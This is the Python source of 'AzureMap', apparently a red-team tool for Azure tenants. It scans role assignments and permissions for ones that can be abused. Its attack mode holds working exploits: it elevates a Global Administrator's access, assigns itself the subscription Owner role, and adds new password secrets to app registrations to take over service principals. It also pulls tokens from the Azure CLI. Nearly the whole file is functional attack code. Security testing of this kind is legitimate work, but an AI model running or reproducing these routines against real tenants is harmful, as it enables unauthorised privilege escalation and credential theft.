import requests
import readline
import base64
import json, sys
import uuid
import os
from prettytable import PrettyTable
import subprocess

Token = None
accessTokenGraph = None
TotalTargets = []
TargetSubscription = None
TargetTenantId = None
ExploitChoosen = None


class SimpleCompleter(object):

    def __init__(self, options):
        self.options = sorted(options)
        return

    def complete(self, text, state):
        response = None
        if state == 0:
            # This is the first time for this text, so build a match list.
            if text:
                self.matches = [s
                                for s in self.options
                                if s and s.startswith(text)]
            else:
                self.matches = self.options[:]

        # Return the state'th item from the match list,
        # if we have that many.
        try:
            response = self.matches[state]
        except IndexError:
            response = None
        return response

def banner():
    a = '''
       db                                                         88b           d88                                                             
      d88b                                                        888b         d888                                                             
     d8'`8b                                                       88`8b       d8'88                                                             
    d8'  `8b      888888888  88       88  8b,dPPYba,   ,adPPYba,  88 `8b     d8' 88  ,adPPYYba,  8b,dPPYba,                                     
   d8YaaaaY8b          a8P"  88       88  88P'   "Y8  a8P_____88  88  `8b   d8'  88  ""     `Y8  88P'    "8a                                    
  d8""""""""8b      ,d8P'    88       88  88          8PP"""""""  88   `8b d8'   88  ,adPPPPP88  88       d8                                    
 d8'        `8b   ,d8"       "8a,   ,a88  88          "8b,   ,aa  88    `888'    88  88,    ,88  88b,   ,a8"                                    
d8'          `8b  888888888   `"YbbdP'Y8  88           `"Ybbd8"'  88     `8'     88  `"8bbdP"Y8  88`YbbdP"'                                     
                                                                                                 88

                                                                                     V.1.0 By Th3location
                '''
    print(a)


def parseUPN():
    global Token
    b64_string = Token.split(".")[1]
    b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
    return json.loads(base64.b64decode(b64_string))['upn']

def parseUPNObjectId():
    global Token
    b64_string = Token.split(".")[1]
    b64_string += "=" * ((4 - len(Token.split(".")[1].strip()) % 4) % 4)
    return json.loads(base64.b64decode(b64_string))['oid']

def setToken(token):
    global Token
    Token = token


def initToken(token):
    global Token
    Token = token


def originitToken(token):
    check = token.split(".")[1]
    audAttribue = json.loads(base64.b64decode(check))['aud']
    if audAttribue != "https://management.azure.com/":
        print(
            "ERROR: Invalid audiance in token, please generate a token with correct audiance. Expected: https://management.azure.com/, provided " + audAttribue + " .")
        sys.exit(-1)
    else:
        print("All set.")
        global Token
        Token = token


'''
This attack path exploits the Global Administrator to modify privileges to Azure Resources
Useful when the account has only access to Azure AD, and no access to Azure Subscriptions
@required_privilege: Global Administrator
@success: No output from API
'''
def GA_ElevateAccess():
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.post(
        "https://management.azure.com/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01",
        headers=headers)
    result = r.text
    if result == "":
        return "Exploit Success!"
    else:
        return "Exploit Failed."

'''
This API help to abuse Global Administrator with privileges to Azure Resources to assign Owner subscription privileges
@required_privilege: Global Administrator w/Azure Resources privileges
@success: Response Context
'''
def GA_AssignSubscriptionOwnerRole(subscriptionId):
    global Token
    print(parseUPN())
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.put(
        "https://management.azure.com/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleAssignments/"+str(uuid.uuid4())+"?api-version=2015-07-01",
        json={
              "properties": {
                "roleDefinitionId": "/subscriptions/"+subscriptionId+"/providers/Microsoft.Authorization/roleDefinitions/8e3af657-a8ff-443c-a75c-2fe8c4bcb635",
                "principalId": str(parseUPNObjectId())
              }
            },
        headers=headers)
    result = r.json()
    if result['error']:
        return "Exploit Failed. Abort."
    else:
        return "Exploit Completed! You're Subscription Owner on SubscriptionId=" + str(subscriptionId)


def RD_AddAppSecret():
    global accessTokenGraph
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + accessTokenGraph
    }
    r = requests.get(
        "https://graph.microsoft.com/v1.0/applications",
        headers=headers)
    result = r.json()
    return result
def CHK_AppRegOwner(appId):
    global accessTokenGraph
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + accessTokenGraph
    }
    r = requests.get("https://graph.microsoft.com/v1.0/applications?$filter=appId eq '" + appId + "'",
                     headers=headers)
    appData = r.json()['value'][0]['id']
    AppOwners = requests.get("https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/owners",headers=headers)
    if str(parseUPN()) in AppOwners.text:
        return "Yes! Try Exploit: Reader/abuseServicePrincipals"
    else:
        return "N/A"

def RD_addPasswordForEntrepriseApp(appId):
    global accessTokenGraph
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + accessTokenGraph
    }
    r = requests.get("https://graph.microsoft.com/v1.0/applications?$filter=appId eq '" + appId + "'",
                     headers=headers)
    appData = r.json()['value'][0]['id']
    addSecretPwd = requests.post(
        "https://graph.microsoft.com/v1.0/applications/" + str(appData) + "/addPassword",
        json={
            "passwordCredential": {
                "displayName": "Password"
            }
        },
        headers=headers)
    print(addSecretPwd.json())
    if addSecretPwd.status_code == 200:
        pwdOwn = addSecretPwd.json()
        return "AppId: " + pwdOwn['keyId'] + "| Pwd: " + pwdOwn['secretText']
    else:
        return "N/A"

def tryGetToken():
    global accessTokenGraph
    try:
        accessToken = None
        add = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=\"https://management.azure.com/\""], capture_output=True, text=True)
        graph = subprocess.run(["powershell.exe", "-c","az account get-access-token --resource=\"https://graph.microsoft.com/\""], capture_output=True, text=True)
        if 'No subscription found' in add.stderr or graph.stderr:
            print("No subscriptions were found. You will need to switch to tenant-level access manually: az login --allow-no-subscriptions")
            print("Failed generate token. You may need to login or try manually.")
        elif 'Exception' in add.stderr or graph.stderr:
            print("Unable to use azure cli for generating token")
            print("Failed generate token. You may need to login or try manually.")
        elif add.stdout == "" or graph.stdout == "":
            print("Failed generate token. You may need to login or try manually.")
        else:
            print("Captured token done. All set!")
            jres = json.loads(add.stdout)
            jresgraph = json.loads(graph.stdout)
            accessToken = jres['accessToken']
            accessTokenGraph = jresgraph['accessToken']
        return accessToken
    except:
        return None



def canRoleBeAbused(currentRoleName):
    vaultAbuseRoles = ["Key Vault Secrets Officer", "Key Vault Secrets User", "Key Vault Administrator"]
    vaultAbuseCertAndKeysOnlyRoles = ["Key Vault Certificates Officer", "Key Vault Crypto Officer"]
    shadowRisks = ["Cloud Application Administrator", "Application Administrator", "Password Administrator",
                   "Privileged Authentication Administrator", "Authentication Administrator",
                   "Privileged Role Administrator", "User Account Administrator", "User Administartor",
                   "Helpdesk Administartor"]
    classicAdministartors = ["Account Administrator", "Service Administrator", "Co-Administrator"]
    if currentRoleName in vaultAbuseRoles:
        return currentRoleName + "|" + "allows to retrieve secrets from key vault."
    elif currentRoleName in vaultAbuseCertAndKeysOnlyRoles:
        return currentRoleName + "|" + "allows to retrieve Certifications/Keys ONLY from key vault."
    elif currentRoleName == "Contributor":
        return currentRoleName + "|" + "can manage all Azure services, without the ability to create role assignments."
    elif currentRoleName == "Reader":
        return currentRoleName + "|" + "allows to read data of the resource."
    elif currentRoleName == "Global Reader":
        return currentRoleName + "|" + "Can read everything in Azure AD, without the ability to update."
    elif currentRoleName == "Global Administrator" or currentRoleName == "Company Administrator":
        return currentRoleName + "|" + "has a god mode, which can manage all aspects of Azure AD. (think like Domain Admin)"
    elif currentRoleName == "Virtual Machine Contributor":
        return currentRoleName + "|" + "allows manage of VMs including disks, snapshots, extensions, and password restoration."
    elif currentRoleName == "Automation Operator" or currentRoleName == "Automation Contributor":
        return currentRoleName + "|" + "allows create and manage jobs, and read runbook names and properties for all runbooks in an Automation account."
    elif currentRoleName == "Storage Blob Data Reader":
        return currentRoleName + "|" + "allows read, write, and delete storage containers and blobs."
    elif currentRoleName == "User Access Administrator":
        return currentRoleName + "|" + "has manage access to all resources within the subscription."
    elif currentRoleName in shadowRisks:
        return currentRoleName + "|" + " has full directory admin rights, easy way to esclate."
    elif currentRoleName in classicAdministartors:
        return currentRoleName + "|" + "Is found as one of the three classic subscription administrative roles. Please notice: Service Administrator and Account Administrator are equivalent to the Owner role in the subscription."
    elif currentRoleName == "Owner":
        return currentRoleName + "|" + "has high privlieged permission, allows to esclate to subscription/tenat level via given resource."
    return False


def canPermissionBeAbused(currentPermission):
    vmPermissions = ["Microsoft.Compute/virtualMachines/runCommand/action",
                     "Microsoft.Compute/virtualMachines/extensions/*"]
    vmAllowDeployPermission = ["Microsoft.Compute/virtualMachines/write"]
    AutomationAccounts = ["Microsoft.Automation/automationAccounts/*",
                          "Microsoft.Automation/automationAccounts/jobs/write",
                          "Microsoft.Automation/automationAccounts/jobSchedules/write"]
    AutomationAccountsRO = ["Microsoft.Automation/automationAccounts/read",
                            "Microsoft.Automation/automationAccounts/runbooks/read",
                            "Microsoft.Automation/automationAccounts/schedules/read",
                            "Microsoft.Automation/automationAccounts/jobs/read"]
    StorangeAccountAbuse = ["Microsoft.ClassicStorage/storageAccounts/listKeys/action",
                            "Microsoft.Storage/storageAccounts/listKeys/action"]
    ARMTemplateAbuse = ["Microsoft.Resources/deployments/*"]
    DirectoryAbuse = ["Microsoft.Resources/deployments/*"]
    ExtensionsAbuse = ["Microsoft.ClassicCompute/virtualMachines/extensions/*",
                       "Microsoft.Compute/virtualMachines/extensions/read",
                       "Microsoft.Compute/virtualMachines/extensions/write"]
    HybridCompute = ["Microsoft.HybridCompute/machines/extensions/write"]
    AllSubscriptions = ["Microsoft.Resources/subscriptions/resourcegroups/deployments/*"]
    AllowToManageRBAC = ["Microsoft.Authorization/roleAssignments/*", "Microsoft.Authorization/*",
                         "Microsoft.Authorization/*/Write", "Microsoft.Authorization/roleAssignments/*",
                         "Microsoft.Authorization/roleDefinition/*", "Microsoft.Authorization/roleDefinitions/*",
                         "Microsoft.Authorization/elevateAccess/Action", "Microsoft.Authorization/roleDefinition/write",
                         "Microsoft.Authorization/roleDefinitions/write",
                         "Microsoft.Authorization/roleAssignments/write",
                         "Microsoft.Authorization/classicAdministrators/write"]
    if currentPermission == "*":
        return "" + "|" + "That's means to have a Contributor permission on resources."
    elif currentPermission in vmPermissions:
        return currentPermission + "|" + "allows execute code on Virtual Machines."
    elif currentPermission in vmAllowDeployPermission:
        return currentPermission + "|" + "allows VM deployment or configuraiton of existing VM."
    elif currentPermission in StorangeAccountAbuse:
        return currentPermission + "|" + "can abuse storage accounts (i.e., view blobs)."
    elif currentPermission in ARMTemplateAbuse:
        return currentPermission + "|" + "allows create and execute of deployment actions."
    elif all(k in currentPermission for k in
             ("Microsoft.Resources/deployments/read", "Microsoft.Resources/subscriptions/resourceGroups/read")):
        return currentPermission + "|" + "have the ability to view ARM templates and history data."
    elif currentPermission in ExtensionsAbuse or currentPermission in HybridCompute:
        return currentPermission + "|" + "allows abuse of VM extensions. (make sure that you have read + write for Custome Script extenstions)"
    elif currentPermission in AllSubscriptions:
        return currentPermission + "|" + "has permission for all subscriptions."
    elif currentPermission == "*/read":
        return currentPermission + "|" + "has read all permission for data."
    elif currentPermission in AutomationAccounts:
        return currentPermission + "|" + "has ability to create automation account jobs (runbooks)."
    elif currentPermission in AutomationAccountsRO:
        return currentPermission + "|" + "has ability to read automation jobs (runbooks)."
    elif currentPermission == "Microsoft.Authorization/*/read":
        return currentPermission + "|" + "has permission to read roles and role assignments."
    elif currentPermission in AllowToManageRBAC:
        return currentPermission + "|" + "able to preform RBAC operations (i.e., add permissions,roles)."
    return False


def GetAllRoleAssignmentsUnderSubscription(subscriptionId):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.get(
        "https://management.azure.com/subscriptions/" + subscriptionId + "/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01",
        headers=headers)
    result = r.json()
    return result

def GetAllRoleAssignmentsUnderSubscriptionAndResourceGroup(subscriptionId,resourceGroupId):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.get(
        "https://management.azure.com/subscriptions/" + subscriptionId + "/resourceGroups/"+resourceGroupId+"/providers/Microsoft.Authorization/roleAssignments?api-version=2015-07-01",
        headers=headers)
    result = r.json()
    return result


def GetAllRoleDefinitionsUnderId(roleId):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.get("https://management.azure.com/" + roleId + "?api-version=2015-07-01", headers=headers)
    result = r.json()
    return result


def AboutWindow():
    print("AzureMap v1.0 Developed By Maor Tal (@th3location)")


def getToken():
    return Token


def displayMenu(state):
    if state:
        print(
            "(1) Auto Generate Token\n(2) Set Azure Tokens\n(3) Display Token\n(4) Reset Azure Token\n(5) Attack Mode\n(6) About AzureMap");
    else:
        return False


def ListSubscriptionsForToken():
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + str(Token)
    }
    r = requests.get("https://management.azure.com/subscriptions/?api-version=2017-05-10", headers=headers)
    result = r.json()
    return result


def GetAllResourcesUnderSubscription(subscriptionId, token):
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + token
    }
    r = requests.get(
        "https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10",
        headers=headers)
    result = r.json()
    return result

def GetAllResourceGroupsUnderSubscription(subscriptionId):
    global Token
    headers = {
        'Content-Type': 'application/json',
        'Authorization': 'Bearer ' + Token
    }
    r = requests.get(
        "https://management.azure.com/subscriptions/" + subscriptionId + "/resources?api-version=2017-05-10",
        headers=headers)
    result = r.json()
    return result


displayMenu(True)

def attackWindow():
    readline.set_completer(SimpleCompleter(['iam full scan', 'iam roles scan', 'iam permission scan', 'get resources','get sts','get subs','set target <subscriptionId>','sts <subscriptionId>','del target <subscriptionId>','del sts <subscriptionId>','back','exit','show exploits']).complete)
    readline.parse_and_bind('tab: complete')
    while (True):
        global TargetSubscription
        global TotalTargets
        global Token
        global ExploitChoosen
        if ExploitChoosen is not None:
            mode = input("$ exploit(" + ExploitChoosen + ") >> ")
        else:
            mode = input("$ >> ")
        if mode == "help":
            print(
                " ===== IAM Abuse =====\niam full scan\niam roles scan\niam permission scan\niam role abuse <ID>\niam permission abuse <ID>\n ===== ARM =====\nget resources / get res\n ===== Utilities =====\nget subs\nset target <subscriptionId> / sts <subscriptionId>\ndel target <subscriptionId> \ del sts\nback / exit")
        elif mode == "get subs":
            listSubs = ListSubscriptionsForToken()
            if listSubs.get('value') == None:
                print("Error occured. Result: " + str(listSubs['error']['message']))
            else:
                subRecords = PrettyTable()
                subRecords.align = "l"
                subRecords.field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
                subRecordCount = 0
                for subRecord in listSubs['value']:
                    subRecords.add_row(
                        [subRecordCount, subRecord['subscriptionId'], subRecord['displayName'], subRecord['state'],
                         subRecord['subscriptionPolicies']['quotaId'],
                         subRecord['subscriptionPolicies']['spendingLimit']])
                    subRecordCount += 1
                    TotalTargets.append(subRecord['subscriptionId'])
                print(subRecords)
        elif "set target " in mode or "sts " in mode:
            argSub = mode.replace("set target", "").replace("sts", "").replace(" ", "")
            if argSub not in TotalTargets:
                print("Invalid target subscription.")
            else:
                print("Set to target SubscriptionId " + argSub)
                TargetSubscription = argSub
        elif "del target " in mode or "del sts " in mode:
            print("Target SubscriptionId cleared!")
            TargetSubscription = []
        elif "iam full scan" in mode:
            print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
            allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
            allRolesAssignsRecords = PrettyTable()
            allRolesAssignsRecords.align = "l"
            allRolesAssignsRecordsCount = 0
            allRolesAssignsRecords.field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
            for role in range(0, len(allRolesAssigns)):
                resultAllRolesAssigns = allRolesAssigns
                currentRoleInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
                currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
                currentRoleName = currentRoleInformation['properties']['roleName']
                allRolesAssignsRecordsCount += 1
                if canRoleBeAbused(currentRoleName) is not False:
                    allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "Yes", canRoleBeAbused(currentRoleName).split("|")[1]])
                else:
                    allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "No", "N/A"])
            print(allRolesAssignsRecords)
            print("\nChecking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
            allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
            allPermRolesAssignsRecords = PrettyTable()
            allPermRolesAssignsRecords.align = "l"
            allPermRolesAssignsRecordsCount = 0
            allPermRolesAssignsRecords.field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
            for rolePermission in range(0, len(allPermRolesAssigns)):
                resultAllRolesAssigns = allPermRolesAssigns
                currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(
                    resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
                currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
                currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
                for permission in currentRolePermissions:
                    allPermRolesAssignsRecordsCount += 1
                    if canPermissionBeAbused(permission) is not False:
                        allPermRolesAssignsRecords.add_row(
                            [allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "Yes", canPermissionBeAbused(permission).split("|")[1]])
                    else:
                        allPermRolesAssignsRecords.add_row(
                            [allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "No", "N/A"])
            print(allPermRolesAssignsRecords)
        elif "iam roles scan" in mode:
            print("Checking all RoleAssignments under SubscriptionId = " + str(TargetSubscription) + "...")
            allRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
            allRolesAssignsRecords = PrettyTable()
            allRolesAssignsRecords.align = "l"
            allRolesAssignsRecordsCount = 0
            allRolesAssignsRecords.field_names = ["#", "RoleName", "Scope", "Can Abused?", "Details"]
            for role in range(0, len(allRolesAssigns)):
                resultAllRolesAssigns = allRolesAssigns
                currentRoleInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][role]['properties']['roleDefinitionId'])
                currentRoleScope = resultAllRolesAssigns['value'][role]['properties']['scope']
                currentRoleName = currentRoleInformation['properties']['roleName']
                allRolesAssignsRecordsCount += 1
                if canRoleBeAbused(currentRoleName) is not False:
                    allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "Yes", canRoleBeAbused(currentRoleName).split("|")[1]])
                else:
                    allRolesAssignsRecords.add_row([allRolesAssignsRecordsCount, currentRoleName, currentRoleScope, "No", "N/A"])
            print(allRolesAssignsRecords)
        elif "iam permission scan" in mode:
            print("Checking all RolePermissions under SubscriptionId = " + str(TargetSubscription) + "...")
            allPermRolesAssigns = GetAllRoleAssignmentsUnderSubscription(str(TargetSubscription))
            allPermRolesAssignsRecords = PrettyTable()
            allPermRolesAssignsRecords.align = "l"
            allPermRolesAssignsRecordsCount = 0
            allPermRolesAssignsRecords.field_names = ["#", "RoleName", "Permission Assigned", "Can Abused?", "Details"]
            for rolePermission in range(0, len(allPermRolesAssigns)):
                resultAllRolesAssigns = allPermRolesAssigns
                currentRolePermissionInformation = GetAllRoleDefinitionsUnderId(resultAllRolesAssigns['value'][rolePermission]['properties']['roleDefinitionId'])
                currentRolePermissionName = currentRolePermissionInformation['properties']['roleName']
                currentRolePermissions = currentRolePermissionInformation['properties']['permissions'][0]['actions']
                for permission in currentRolePermissions:
                    allPermRolesAssignsRecordsCount += 1
                    if canPermissionBeAbused(permission) is not False:
                        allPermRolesAssignsRecords.add_row([allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "Yes", canPermissionBeAbused(permission).split("|")[1]])
                    else:
                        allPermRolesAssignsRecords.add_row([allPermRolesAssignsRecordsCount, currentRolePermissionName, permission, "No", "N/A"])
            print(allPermRolesAssignsRecords)
        elif "get resources" in mode or "get res" in mode:
            if TargetSubscription == None:
                print("Please set target subscription.")
            else:
                print("Listing resources under SubscriptionId = " + str(TargetSubscription) + "...")
                resultResources = GetAllResourcesUnderSubscription(str(TargetSubscription), Token)
                resultsInternalRes = resultResources['value']
                subResRecords = PrettyTable()
                subResRecords.align = "l"
                subResRecordCount = 0
                subResRecords.field_names = ["#", "Resource Name", "Type", "Location"]
                for objRes in range(0, len(resultsInternalRes)):
                    resultResources = resultsInternalRes
                    subResRecordCount += 1
                    subResRecords.add_row(
                        [subResRecordCount, resultResources[objRes]['name'], resultResources[objRes]['type'],
                         resultResources[objRes]['location']])
                print(subResRecords)
        elif mode == "show exploits":
            subExploitRecords = PrettyTable()
            subExploitRecords.align = "l"
            subExploitRecords.field_names = ["Name", "Disclosure Date", "Rate", "Description"]
            subExploitRecords.add_row(["GlobalAdministrator/elevateAccess", "04.07.2022", "Good", "Exploits the Global Administrator role to modify privileges to Azure Resources"])
            print(subExploitRecords)
        elif "use " in mode:
            argExpSub = mode.replace("use ", "").replace(" ", "")
            ExploitChoosen = argExpSub
        elif mode == "back" or mode == "exit":
            if ExploitChoosen is not None:
                ExploitChoosen = None
            else:
                exit
                statupWindow(True)
        elif "Reader/ListServicePrincipal" in ExploitChoosen and mode == "run":
            print("Trying to enumerate all service principles (App registrations)..")
            EntAppsRecords = PrettyTable()
            EntAppsRecords.align = "l"
            EntAppsRecords.field_names = ["#", "App Name", "AppId", "Domain", "Has Ownership?"]
            EntAppsRecordsCount = 0
            for EntAppsRecord in RD_AddAppSecret()['value']:
                print(CHK_AppRegOwner(EntAppsRecord['appId']))
                EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'], EntAppsRecord['publisherDomain'], CHK_AppRegOwner(EntAppsRecord['appId'])])
                EntAppsRecordsCount += 1
            print(EntAppsRecords)
        elif "Reader/abuseServicePrincipals" in ExploitChoosen and mode == "run":
            print("Trying to enumerate all Enterprise applications (service principals)..")
            EntAppsRecords = PrettyTable()
            EntAppsRecords.align = "l"
            EntAppsRecords.field_names = ["#", "App Name", "AppId", "Domain", "RoleAssignments","Can Abused?"]
            EntAppsRecordsCount = 0
            for EntAppsRecord in RD_AddAppSecret()['value']:
                print("Trying to register service principle for " + EntAppsRecord['displayName'] + " app..")
                pwdGen = RD_addPasswordForEntrepriseApp(EntAppsRecord['appId'])
                if pwdGen == "N/A":
                    EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'], EntAppsRecord['publisherDomain'], "N/A"])
                else:
                    EntAppsRecords.add_row([EntAppsRecordsCount, EntAppsRecord['displayName'], EntAppsRecord['appId'],
                                            EntAppsRecord['publisherDomain'],pwdGen])
                EntAppsRecordsCount += 1
            print(EntAppsRecords)
        elif "GlobalAdministrator/elevateAccess" in ExploitChoosen and mode == "run":
            print("Elevating access to the root management group..")
            print(GA_ElevateAccess())
            print("Listing Target Subscriptions..")
            listSubs = ListSubscriptionsForToken()
            if listSubs.get('value') == None:
                print("Exploit Failed: Error occured. Result: " + str(listSubs['error']['message']))
            else:
                subRecords = PrettyTable()
                subRecords.align = "l"
                subRecords.field_names = ["#", "SubscriptionId", "displayName", "State", "Plan", "spendingLimit"]
                subRecordCount = 0
                for subRecord in listSubs['value']:
                    subRecords.add_row(
                        [subRecordCount, subRecord['subscriptionId'], subRecord['displayName'], subRecord['state'],
                         subRecord['subscriptionPolicies']['quotaId'],
                         subRecord['subscriptionPolicies']['spendingLimit']])
                    subRecordCount += 1
                print(subRecords)
                TargetSubscriptionVictim = input("Choose Subscription >> ")
                print(GA_AssignSubscriptionOwnerRole(str(TargetSubscriptionVictim)))
        else:
            print("unkown command.")


def statupWindow(isFromMenu):
    if isFromMenu:
        print("You're out of attack mode.")
        isFromMenu = False
    while (True):
        opt = input(">> ")
        if opt == "1":
            print("Trying getting token automaticlly for you...")
            initToken(tryGetToken())
        elif opt == "2":
            print("Please paste your Azure token here:")
            token = input("Enter Token:")
            initToken(token)
            print("All set.")
        elif opt == "3":
            print("Display Current token:")
            print(getToken())
        elif opt == "4":
            print("Resetting token..")
            setToken("")
        elif opt == "5":
            print("Getting into attack mode.. use command help for navigate")
            attackWindow()
        elif opt == "6":
            AboutWindow()
        else:
            displayMenu(True)


statupWindow(False)
